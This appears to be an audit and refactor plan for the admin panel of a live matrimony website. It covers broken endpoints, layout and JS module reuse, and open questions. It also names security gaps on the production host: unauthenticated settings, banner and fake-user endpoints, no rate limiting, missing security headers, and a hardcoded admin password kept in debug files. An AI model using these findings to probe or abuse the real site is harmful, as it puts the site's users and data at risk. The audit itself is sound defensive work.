- UI calls to endpoints that don't exist: settings.html GET /api/users, /api/banners, /api/castes, /api/gotras, PUT/DELETE /api/users/:id (curl -> 404 text/html); logout redirects to /login (404); beta-testers css/admin-style.css (404); via.placeholder.com images (user-detail.html:91)
- API mounts: index.js:93-94 app.use('/api/admin', routes/admin) then routes/adminRoutes (blogs, apk); /api/contact, /api/beta-tester, /api/city-pages, /api/state-pages, /api/auth (community-feedback lives here, unauthenticated), /api (settingsRoute: /updateSettings unauthenticated, /download-apk public)
- Models referenced: User gender enum ['Male','Female','Not specified'] (enum/enum.js:4); UserPhoto.userId + moderationStatus default 'approved'; FriendShipRequest.requester/recipient; ActivityLog.userId; Notification.fromUser/toUser; IncomeRange has only `name` (no `range`)
- No rate limiting anywhere (no limit_req in nginx, no express-rate-limit in API)
- pm2: banjaramatch-admin cwd /var/www/admin.banjaramatch.com, banjaramatch-api cwd /var/www/api.banjaramatch.com, banjaramatch-web cwd /var/www/banjaramatch.com, all online; admin dir is not a git repo (no .git)
- Admin vhost security headers: X-Frame-Options, nosniff, X-XSS-Protection only; no HSTS, no CSP, no noindex; robots.txt 404; static .js/.css cached 1y immutable without fingerprinting

## reusable
- Base layout approach (fits the monorepo move to banjaramatch.com/admin): render admin pages with EJS (already a dependency in admin package.json and the web app's engine). Use views/admin/layout.ejs containing <head>, sidebar, topbar and page shell, plus partials/admin/{sidebar,topbar,toast,modal,pagination}.ejs. Each page becomes views/admin/pages/<name>.ejs that only provides its content block, pageTitle and pageScript. Generate the sidebar from one NAV array (config/adminNav.js: key, href, icon, label, group) so every page has an identical menu with the active state set server-side. Gate every /admin/* route with server-side middleware that verifies an httpOnly admin_session cookie before rendering, and remove nginx static serving of *.html.
- Keep /var/www/admin.banjaramatch.com/public/css/style.css as the seed: it already defines :root tokens (--primary-color #6366f1, --secondary-color, --danger/--success/--warning, --border, --text-*) and the sidebar/topbar/card/form/table/badge/modal/alert/pagination/spinner/info-grid classes used by about 12 pages. Promote it to admin.css with full tokens (spacing scale, radius, shadow, font sizes, z-index) and component classes .bm-table, .bm-modal, .bm-toast, .bm-badge--{success,warning,danger,info,neutral}, .bm-btn--{primary,secondary,danger,ghost}, .bm-pagination, .bm-empty, .bm-skeleton, plus a mobile .sidebar.active toggle. Drop Bootstrap from users, contact-enquiries, beta-testers, broadcast-email and login, and drop FontAwesome/Bootstrap-icons for one icon set or emoji.
- Reuse /var/www/admin.banjaramatch.com/public/js/api.js apiRequest() as the single HTTP client, but make it an ES module (admin/js/core/api.js). Use a relative base '/api' (same origin after the monorepo move), remove all console logging, parse non-JSON error bodies safely, normalise {status|success}, add AbortController timeouts, and raise toast errors centrally. Delete every page-local `const API_URL/API_BASE/API_BASE_URL` and raw fetch(), and the window.fetch monkey-patches in contact-enquiries.html:120-134 and beta-testers.html:43-57.
- Reuse /var/www/admin.banjaramatch.com/public/js/auth.js checkAuth/logout/getCurrentAdmin as core/auth.js. Make it the only logout (calls POST /api/admin/auth/logout, clears storage, redirects to /admin/login), and delete the page-local logout() overrides in users.html:781, city-pages.html:900, state-pages.html:960, regional-pages.html:327, contact-enquiries.html:598, apk-manager.html:693 and community-feedback.html:805.
- Reuse the escape helper from /var/www/admin.banjaramatch.com/public/community-data.html:433 (`esc()` escapes & " < >) as core/dom.js `esc()`, plus an `html` tagged-template helper that auto-escapes interpolations. Use it in every table/modal renderer and replace the weaker escapeHtml in reports.html:276 and contact-enquiries.html:1239.
- Reuse /var/www/admin.banjaramatch.com/public/js/notifications.js showNotification styling (icon + colored left border + close) as the single core/toast.js. Delete the duplicate showNotification in api.js:87-104 and all alert() calls (dashboard.html blog/regional functions).
- Shared components to extract as JS modules: DataTable({columns, fetchPage, rowActions}) with loading/empty/error states; Pagination({page,pages}) with windowed numbers like users.html:502-538 (the best existing version); Modal (style.css .modal/.modal.active already used by reports, banners and constants); ConfirmDialog (replaces window.confirm/prompt, including typed-confirm for destructive actions as in user-detail.html:522); FilterBar that serializes to the query contract; ImageUrl helper (photo-moderation.html:142-147 photoUrl() is correct, use everywhere); Badge(status) map.
- Page-level modules: admin/js/pages/<page>.js loaded via a single <script type=module> per page from the layout, using event delegation with data-action/data-id attributes instead of inline onclick. Good first targets: users (list + link to a real user-detail page), reports, photo-moderation, contact-enquiries, community-feedback, beta-testers, blogs (pull out of dashboard.html:319-480 and 828-1112), city-pages, state-pages, constants+community-data (merge), settings (rebuild on /api/admin/settings), apk-manager, broadcast-email.
- API side: reuse middleware/adminAuth.js but drop cookie-first precedence and the cookie logging. Add an audit-log model for admin actions (reports already store resolvedBy/resolvedAt; extend that to block/verify/delete/settings). Reuse controllers/admin/reportController.js as the reference style (validated status enum, populate with field selection).

## open_questions
- Is the hardcoded admin password from debug.html / ADMIN_CREDENTIALS.md still valid on admin@banjaramatch.com? I could not test it (no POST allowed). It should be rotated regardless.
- Are the unauthenticated /api/updateSettings, /api/banner/add, /api/user/fake-batch and /api/user/mark-top used by the Flutter app or the website? If so they need an auth-preserving migration rather than outright removal.
- After the monorepo move, should the admin live at banjaramatch.com/admin (same origin, lets you drop CORS and use an httpOnly session cookie) or stay on admin.banjaramatch.com behind the same codebase? This decides cookie scoping and the CSP.
- Should 'Block' fully lock the account (reject login and revoke sessions) or only hide the profile? Today it effectively only hides, while reports.html tells admins it blocks the user immediately.
- Should new photo uploads require moderation (default 'pending')? The UserPhoto schema defaults to 'approved', so the 'Pending review' queue is always empty.
- Is multi-admin with roles (moderator vs super-admin) needed? There is currently a single role==='admin' flag on User and no admin audit log.
- Are the Settings 'Danger Zone' actions (delete inactive or all blocked users, verify all) actually wanted? They don't work today, and they would be destructive if implemented as written.
